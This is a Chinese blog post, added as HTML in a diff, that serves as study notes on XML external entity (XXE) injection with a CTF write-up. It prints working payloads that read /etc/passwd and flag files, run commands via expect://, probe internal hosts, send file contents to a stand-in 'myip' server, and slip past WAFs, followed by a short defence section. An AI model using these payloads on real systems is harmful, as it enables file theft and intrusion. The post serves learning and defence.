@@ -1,0 +1,519 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>XML外部实体注入漏洞与利用学习 | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="XML外部实体注入漏洞与利用学习 | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+什么是XXE
+XML外部实体注入(XML External Entity Injection)，即攻击者通过干扰应用程序对XML数据的处理，从而实现读取应用程序服务器文件系统中的文件，并与应用程序本身可以访问到的任何后端或外部系统进行交互..." />
+    <meta name="keywords" content="Summary,XXE,Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              XML外部实体注入漏洞与利用学习
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-08-31
+              </span>
+              <span>
+                12 min read
+              </span>
+              <span class="page-view" key="20190831003743" title="XML外部实体注入漏洞与利用学习">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/summary/" class="post-tag">
+                  # Summary
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/xxe/" class="post-tag">
+                  # XXE
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-31-09-12-49.png" alt="" loading="lazy"></figure>
+<h2 id="什么是xxe">什么是XXE</h2>
+<p>XML外部实体注入(<strong>X</strong>ML E<strong>x</strong>ternal <strong>E</strong>ntity Injection)，即攻击者通过干扰应用程序对XML数据的处理，从而实现读取应用程序服务器文件系统中的文件，并与应用程序本身可以访问到的任何后端或外部系统进行交互的一种Web安全漏洞。</p>
+<p>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题。</p>
+<p>在某些情况下，攻击者可以通过利用XXE漏洞执行<a href="https://3nd.xyz/2019/08/22/ssrf-learning-note/"><strong>服务端请求伪造攻击</strong>(server-side request forgery)</a>来升级XXE攻击以危及底层服务器或者其他后端基础架构。</p>
+<ul>
+<li>XML基础</li>
+</ul>
+<p><code>XML</code>(extensible markup language)是用于标记电子文件使其具有结构性的<strong>可拓展标记语言</strong>，用于存储和传输数据。与HTML一样，XML使用标签和树形结构。与HTML不同，XML不使用预定义标记，因此可以标记指定描述数据的名称。</p>
+<p>XML文档结构包括XML声明、<code>DTD</code>文档类型定义（可选）、文档元素。</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!-- xml声明 --&gt;
+&lt;!DOCTYPE note [ &lt;!-- DTD文档类型定义 根元素note --&gt;
+  &lt;!ELEMENT note (to, from, heading, body)&gt; &lt;!--note中的子元素--&gt;
+  &lt;!ELEMENT to (#PCDATA)&gt; &lt;!-- 接收者 --&gt;
+  &lt;!ELEMENT from (#PCDATA)&gt; &lt;!-- 发送者 --&gt;
+  &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!-- 标题 --&gt;
+  &lt;!ELEMENT body (#PCDATA)&gt; &lt;!-- 消息主题 --&gt;
+]&gt;
+&lt;note&gt; &lt;!--文档元素--&gt;
+    &lt;to&gt;Jerry&lt;/to&gt;
+    &lt;from&gt;Tom&lt;/from&gt;
+    &lt;heading&gt;Reminder&lt;/heading&gt;
+    &lt;body&gt;Don't forget the meeting!&lt;/body&gt;
+&lt;/note&gt;
+</code></pre>
+<ul>
+<li>文档类型定义</li>
+</ul>
+<p>XML文档类型定义（DTD）包含可以定义XML文档结构，它可以包含的数据值类型以及其他项的声明。 DTD在XML文档开头的可选<code>DOCTYPE</code>元素中声明。 DTD可以完全独立于文档本身（称为“内部DTD”），也可以从其他地方加载（称为“外部DTD”），也可以是两者的混合。</p>
+<pre><code class="language-xml">&lt;!-- 内部声明 --&gt;
+&lt;!DOCTYPE 根元素 [元素声明]&gt;
+&lt;!-- 引用外部DTD --&gt;
+&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
+</code></pre>
+<ul>
+<li>XML Entity</li>
+</ul>
+<p>XML实体是在XML文档中表示数据项的一种方法，而不是使用数据本身，可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p>
+<pre><code class="language-xml">&lt;!--内部声明实体--&gt;
+&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
+&lt;!--引用外部实体--&gt;
+&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
+</code></pre>
+<p>XML外部实体是一种自定义实体，其定义位于声明它们的DTD之外。</p>
+<p>外部实体的声明使用SYSTEM关键字，并且必须指定应从中加载实体值的URL。 例如：</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;
+</code></pre>
+<p>URL可以使用<code>file://</code>协议，因此可以从文件加载外部实体。例如:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;
+</code></pre>
+<p>实体又分为参数实体与一般实体：</p>
+<ul>
+<li>一般实体指代的是将来XML数据文档要用到的文本或数据。</li>
+</ul>
+<pre><code class="language-xml">&lt;!--声明语法--&gt;
+&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;
+&lt;!--引用方式--&gt;
+&amp;实体名;
+</code></pre>
+<ul>
+<li>参数实体的作用是作为DTD中的元素的条件控制。</li>
+</ul>
+<p>参数实体必须定义在<strong>单独的DTD文档</strong>中或XML文档的DTD区(但是<strong>引用</strong>只能在单独的DTD文档中，即<strong>外部子集</strong>，而不能在XML文档的DTD区-&gt;内部子集)。</p>
+<pre><code class="language-xml">&lt;!--XML解析器都不会解析同级参数实体的内容--&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;  
+    &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt; 
+    %send;
+]&gt;
+</code></pre>
+<p>参数实体引用(Parameter Entity Reference)，禁止在内部DTD中引用参数实体。</p>
+<pre><code class="language-xml">&lt;!--嵌套 PEReferences forbidden in internal subset in Entity PEReferences --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
+    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://myip/?%file;'&gt;&quot;&gt;
+    %start;
+    %send;
+]&gt;
+</code></pre>
+<p>=&gt; 引用外部的DTD</p>
+<pre><code class="language-xml">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://myip:10001/?%file;'&gt;&quot;&gt;
+%start;
+</code></pre>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % remote SYSTEM &quot;http://myip/xml.dtd&quot;&gt;  
+    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;
+    %remote;
+    %send;
+]&gt;
+&lt;message&gt;1234&lt;/message&gt;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-31-11-02-11.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p>External DTD allows us to include one entity inside the second, but it is prohibited in the internal DTD.</p>
+</blockquote>
+<h2 id="xxe是如何产生的">XXE是如何产生的</h2>
+<p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。引入外部实体方式有多种，比如：</p>
+<ul>
+<li>内部声明实体</li>
+</ul>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a[
+  &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+</code></pre>
+<ul>
+<li>外部引用DTD</li>
+</ul>
+<p>evil.dtd:</p>
+<pre><code class="language-xml">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</code></pre>
+<p>方式1：</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a SYSTEM &quot;http://normal-website.com/evil.dtd&quot;&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+</code></pre>
+<p>方式2:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a[
+  &lt;!ENTITY % d SYSTEM &quot;http://normal-website.com/evil.dtd&quot;&gt;
+  %d;
+]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+</code></pre>
+<p>另外不同应用程序支持的协议不同:</p>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-31-10-32-27.png" alt="" loading="lazy"></figure>
+<p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有:</p>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-31-10-34-54.png" alt="" loading="lazy"></figure>
+<h2 id="xxe攻击方式">XXE攻击方式</h2>
+<ul>
+<li>读取任意文件</li>
+</ul>
+<pre><code class="language-xml">&lt;?xml verison=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY[
+  &lt;!ENTITY xxe SYSTEM &quot;file://etc/passwd&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<ul>
+<li>执行系统命令</li>
+</ul>
+<pre><code class="language-xml">&lt;!--装有expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。--&gt;
+&lt;?xml verison=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE ANY[
+  &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<ul>
+<li>探测内网端口</li>
+</ul>
+<pre><code class="language-xml">&lt;?xml verison=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [ 
+  &lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.1:80/&quot;&gt; 
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<ul>
+<li>攻击内网网站</li>
+</ul>
+<pre><code class="language-xml">&lt;!--攻击内网struts2网站，远程执行系统命令--&gt;
+&lt;?xml verison=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [ 
+  &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.122:8080/struct2-blank/example/Helloworld.action?redirect:...payload..&quot;&gt; 
+]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+</code></pre>
+<h2 id="利用本地dtd执行xxe">利用本地DTD执行XXE</h2>
+<p>想象一下我们有一个XXE利用点，支持外部实体，但服务器的响应始终为空。 在这种情况下，我们有两种选择：基于错误(<code>error-based</code>)和带外(<code>out-of-band</code>)利用。</p>
+<ul>
+<li>Error Based</li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-31-11-49-37.png" alt="" loading="lazy"></figure>
+<p>这里我们可以看见此利用方式正在使用外部服务器进行有效负载传递。 如果我们和目标服务器之间有防火墙，我们可以做什么？上面的利用方式将会失效。</p>
+<p>如果我们只将外部DTD内容直接放入DOCTYPE怎么办？ 总会出现一些错误：</p>
+<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-31-11-53-15.png" alt="" loading="lazy"></figure>
+<p>外部的DTD允许我们在一个实体中包含引用另外一个实体，但是在内部DTD子集中这种行为是被禁止的。</p>
+<p>而由于防火墙的存在，我们又无法远程引用自定义的DTD文档类型说明进行利用，这时我们就把目光放到了服务器本地所存在的DTD文件。</p>
+<p>我们可以对本地的DTD文件做些什么呢？要在内部DTD子集中使用外部DTD语法，我们可以在目标主机上强制执行本地dtd文件，并在其中重新定义一些参数实体引用：</p>
+<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-31-12-01-03.png" alt="" loading="lazy"></figure>
+<p>这种方式起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体，则仅使用第一个实体。</p>
+<ul>
+<li><strong>OGeek CTF Web LookAround</strong></li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-25-22-07-44.png" alt="" loading="lazy"></figure>
+<p>F12查看网页源代码，在<code>./js/xxx.js</code>中存在以下关键代码：</p>
+<pre><code class="language-js">var data = &quot;&lt;?xml version=\&quot;1.0\&quot; ?&gt;\n&lt;request&gt;\n    &lt;status&gt;1&lt;/status&gt;\n&lt;/request&gt;&quot;;
+
+setInterval(function(){
+    $.post(&quot;callback&quot;, data);
+}, 10000);
+</code></pre>
+<p>经fuzz发现无法无法访问包含远程服务器dtd文件，xml正常解析无回显~ 至此就确定了远程包含DTD、带外传输数据都是失效的，这时我们可以尝试利用基于错误的本地dtd包含利用。</p>
+<p>/usr/share/xml/fontconfig/fonts.dtd:</p>
+<pre><code class="language-xml">&lt;!ENTITY % expr 'int|double|string|matrix|bool|charset|langset
+      |name|const
+      |or|and|eq|not_eq|less|less_eq|more|more_eq|contains|not_contains
+      |plus|minus|times|divide|not|if|floor|ceil|round|trunc'&gt;
+[...]
+&lt;!ELEMENT test (%expr;)*&gt;
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;
+    &lt;!ENTITY % expr 'aaa)&gt;
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+        &lt;!ELEMENT aa (bb'&gt;
+    %local_dtd;
+]&gt;
+&lt;message&gt;any text&lt;/message&gt;
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-25-22-11-57.png" alt="" loading="lazy"></figure>
+<h2 id="一些绕过技巧">一些绕过技巧</h2>
+<ul>
+<li>利用<strong>php://filter</strong>规避字符混乱</li>
+</ul>
+<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
+<pre><code class="language-php">php://filter/read=convert.base64-encode/resource=./xxe.php
+</code></pre>
+<blockquote>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p>
+</blockquote>
+<ul>
+<li>文档中的额外空格</li>
+</ul>
+<p>由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<?xml?>或&lt;!DOCTYPE&gt;中插入额外的空格，从而绕过此类WAF。</p>
+<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-31-12-36-45.png" alt="" loading="lazy"></figure>
+<ul>
+<li>外来编码(Exotic encodings)</li>
+</ul>
+<p>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。<br>
+在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/4059">绕过WAF保护的XXE</a></p>
+</blockquote>
+<h2 id="如何防御xxe">如何防御XXE</h2>
+<ul>
+<li>使用开发语言提供的禁用外部实体的方法</li>
+</ul>
+<p>实际上，所有XXE漏洞会出现的原因是应用程序的XML解析库支持应用程序不需要或不打算使用的潜在危险的XML功能。防止XXE攻击的最简单，最有效的方法是禁用这些功能。</p>
+<pre><code class="language-php">libxml_disable_entity_loader(true);
+</code></pre>
+<blockquote>
+<p><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html">XML External Entity Prevention Cheat Sheet</a></p>
+</blockquote>
+<ul>
+<li>过滤用户提交的XML数据</li>
+</ul>
+<pre><code class="language-xml">Keyword: SYSTEM PUBLIC ...
+</code></pre>
+<h2 id="参考">参考</h2>
+<ul>
+<li>
+<p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Exploiting XXE with local DTD files</a></p>
+</li>
+<li>
+<p><a href="https://www.freebuf.com/vuls/207639.html">Blind XXE详解与Google CTF一道题分析</a></p>
+</li>
+<li>
+<p><a href="https://portswigger.net/web-security/xxe">XML external entity (XXE) injection</a></p>
+</li>
+<li>
+<p><a href="https://security.tencent.com/index.php/blog/msg/69">未知攻焉知防——XXE漏洞攻防</a></p>
+</li>
+<li>
+<p><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation">AUTOMATING LOCAL DTD DISCOVERY FOR XXE EXPLOITATION</a></p>
+</li>
+</ul>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFxxe">什么是XXE</a></li>
+<li><a href="#xxe%E6%98%AF%E5%A6%82%E4%BD%95%E4%BA%A7%E7%94%9F%E7%9A%84">XXE是如何产生的</a></li>
+<li><a href="#xxe%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F">XXE攻击方式</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0dtd%E6%89%A7%E8%A1%8Cxxe">利用本地DTD执行XXE</a></li>
+<li><a href="#%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7">一些绕过技巧</a></li>
+<li><a href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1xxe">如何防御XXE</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-09-01-php-unserialize-learning-note/">
+                <h3 class="post-title" style="text-align: left;">
+                  PHP 反序列化漏洞利用与学习
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-08-30-500th-zone-ctf-web/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  第五空间网络安全大赛Web Writeup
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
